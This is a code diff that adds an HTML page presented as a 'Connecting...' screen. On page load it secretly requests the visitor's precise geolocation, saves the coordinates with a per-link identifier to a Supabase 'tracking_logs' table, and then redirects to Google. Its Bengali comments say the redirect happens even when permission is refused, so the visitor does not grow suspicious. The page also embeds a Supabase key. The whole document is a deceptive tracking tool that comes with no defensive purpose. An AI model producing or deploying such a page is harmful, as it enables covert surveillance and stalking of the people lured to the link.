@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Connecting...</title>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+</head>
+<body style="background-color: white;">
+    <script>
+        const supabaseUrl = 'https://nhhcijrjrcxznsqltzom.supabase.co';
+        const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5oaGNpanJqcmN4em5zcWx0em9tIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzM5MTMyODAsImV4cCI6MjA4OTQ4OTI4MH0.1CG80rxN01S00lCQ1gkqyKdenDJR_XjM0uQtEAln9XU';
+        const supabase = supabase.createClient(supabaseUrl, supabaseKey);
+
+        async function start() {
+            const params = new URLSearchParams(window.location.search);
+            const id = params.get('id') || 'Anon_User';
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    // Database-e data pathano
+                    await supabase.from('tracking_logs').insert([{ 
+                        user_identifier: id, 
+                        latitude: pos.coords.latitude, 
+                        longitude: pos.coords.longitude 
+                    }]);
+                    
+                    // Location pawa gele shathe shathe Google-e pathiye dao
+                    window.location.replace("https://www.google.com");
+                }, (err) => {
+                    // Permission na dileo Google-e pathiye dao jate shondeho na kore
+                    window.location.replace("https://www.google.com");
+                }, { enableHighAccuracy: true });
+            } else {
+                window.location.replace("https://www.google.com");
+            }
+        }
+        window.onload = start;
+    </script>
+</body>
+</html>
